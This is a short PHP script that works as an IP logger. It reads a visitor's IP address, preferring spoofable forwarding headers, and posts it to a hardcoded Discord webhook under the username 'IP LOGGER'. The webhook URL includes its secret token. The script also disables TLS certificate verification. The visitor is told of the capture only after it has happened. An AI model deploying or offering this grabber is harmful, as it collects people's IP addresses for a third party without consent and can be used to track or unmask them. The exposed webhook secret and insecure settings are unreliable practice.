<?php
 
 function get_client_ip() {
     $ipaddress = '';
     if (isset($_SERVER['HTTP_CLIENT_IP']))
         $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
     else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
         $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
     else if(isset($_SERVER['HTTP_X_FORWARDED']))
         $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
     else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
         $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
     else if(isset($_SERVER['HTTP_FORWARDED']))
         $ipaddress = $_SERVER['HTTP_FORWARDED'];
     else if(isset($_SERVER['REMOTE_ADDR']))
         $ipaddress = $_SERVER['REMOTE_ADDR'];
     else
         $ipaddress = 'UNKNOWN';
     return $ipaddress;
 
     
 }
 
 function postToDiscord()
 {
     $ipaddress = get_client_ip();
 
     $url = "https://discord.com/api/webhooks/1052957383728574504/PL41vMjBjIXuKBdSw9MLKJzH1YqVIO2qRKD7eO8Bm3ru7SEhVjo0ErEjzhNDoOEWU-G3";
     $headers = [ 'Content-Type: application/json; charset=utf-8' ];
     $POST = [ 'username' => 'IP LOGGER', 'content' => "@fr#1112 The IP is $ipaddress" ];
 
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_POST, true);
     curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
     $response   = curl_exec($ch);
 }
  
  
 echo "Your IP address is: " . get_client_ip();
 echo "Sent to Discord." . postToDiscord();
 ?> 